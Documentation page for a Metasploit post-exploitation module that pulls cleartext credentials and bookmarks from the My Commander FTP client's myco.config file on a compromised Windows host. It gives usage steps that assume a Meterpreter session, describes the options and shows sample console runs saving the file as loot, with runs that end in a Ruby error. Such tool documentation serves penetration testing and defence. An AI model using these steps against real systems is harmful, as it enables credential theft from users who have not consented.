## Vulnerable Application

This post-exploitation module extracts clear text credentials from the My Comander FTP Client.

The My Commander FTP Client is avaialble from (https://myco.yonan.ro/).

This module extracts information from the myco.config file in the "AppData\Local\Yonan Research" directory.

This module extracts saved bookmarks.


## Verification Steps

1. Start MSF console
2. Get a Meterpreter session on a Windows system
3. use post/windows/gather/credentials/mycommander_ftp
4. Set SESSION 1
5. enter 'run' to extract credentials from all applications


## Options
### VERBOSE

By default verbose is turned off. When turned on, the module will show information on files
which aren't extracted and information that is not directly related to the artifact output.


### STORE_LOOT
This option is turned on by default and saves the stolen artifacts/files on the local machine,
this is required for also extracting credentials from files using regexp, JSON, XML, and SQLite queries.


### EXTRACT_DATA
This option is turned on by default and will perform the data extraction using the predefined
regular expression. The 'Store loot' options must be turned on in order for this to take work.

## Scenarios
### My Commander Client v4.0 on Windows 10 Home 10.0.19045 N/A Build 19045 Default
```
msf6 post(windows/gather/credentials/mycommander_ftp) > run

[*] Filtering based on these selections:  
[*] ARTIFACTS: All
[*] STORE_LOOT: true
[*] EXTRACT_DATA: true

[*] My commander's Myco.config file found
[*] Downloading C:\Users\test\AppData\Local\Yonan Research\My Commander\myco.config
[*] My commander Myco.config downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240510165005_default_10.0.0.2_MyCommandermyco_391438.config

[*] undefined method `each' for nil:NilClass
[*] PackRat credential sweep Completed
[*] Post module execution completed
```

### My Commander Client v4.0 on Windows 10 Home 10.0.19045 N/A Build 19045 Default
```
msf6 post(windows/gather/credentials/mycommander_ftp) > run

[*] Filtering based on these selections:  
[*] ARTIFACTS: All
[*] STORE_LOOT: true
[*] EXTRACT_DATA: true

[*] Starting Packrat...
[-] My commander's base folder not found in user's user directory

[*] Starting Packrat...
[*] My commander's base folder found
[*] Found the folder containing specified artifact for myco.config.
[*] My commander's Myco.config file found
[*] Processing C:\Users\test\AppData\Local\Yonan Research\My Commander
[*] Downloading C:\Users\test\AppData\Local\Yonan Research\My Commander\myco.config
[*] My commander Myco.config downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240510165029_default_10.0.0.2_MyCommandermyco_977628.config

[*] undefined method `each' for nil:NilClass
[*] PackRat credential sweep Completed
[*] Post module execution completed
```
